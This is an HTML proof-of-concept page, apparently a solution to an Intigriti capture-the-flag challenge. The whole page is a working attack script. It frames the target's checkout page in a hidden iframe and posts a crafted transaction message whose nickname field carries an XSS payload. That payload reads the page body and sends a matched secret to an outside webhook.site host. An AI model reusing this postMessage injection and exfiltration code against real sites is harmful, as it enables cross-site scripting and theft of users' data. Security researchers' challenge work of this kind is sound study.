<!DOCTYPE html>
<body>
<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';

fetch(`${WEBHOOK}/?step=1_start`);

const xss = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}/?xss=1');const f=document.body.innerHTML;const m=f.match(/INTIGRITI{[^}]+}/);if(m)fetch('${WEBHOOK}/?flag='+encodeURIComponent(m[0]))">`;

const f = document.createElement('iframe');
f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
f.style.display = 'none';
document.body.appendChild(f);

f.onload = () => {
  fetch(`${WEBHOOK}/?step=2_loaded`);

  setTimeout(() => {
    f.contentWindow.postMessage({
      type: 'submitTransaction',
      transaction: {
        nickname: xss,
        toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
        currency: '1337COIN',
        amount: 1
      }
    }, '*');

    fetch(`${WEBHOOK}/?step=3_sent`);

    setTimeout(() => {
      fetch(`${WEBHOOK}/?step=4_redirect`);
      window.location = `${BASE}/marketwatch.html`;
    }, 3000);
  }, 2000);
};
</script>
</body>
</html>
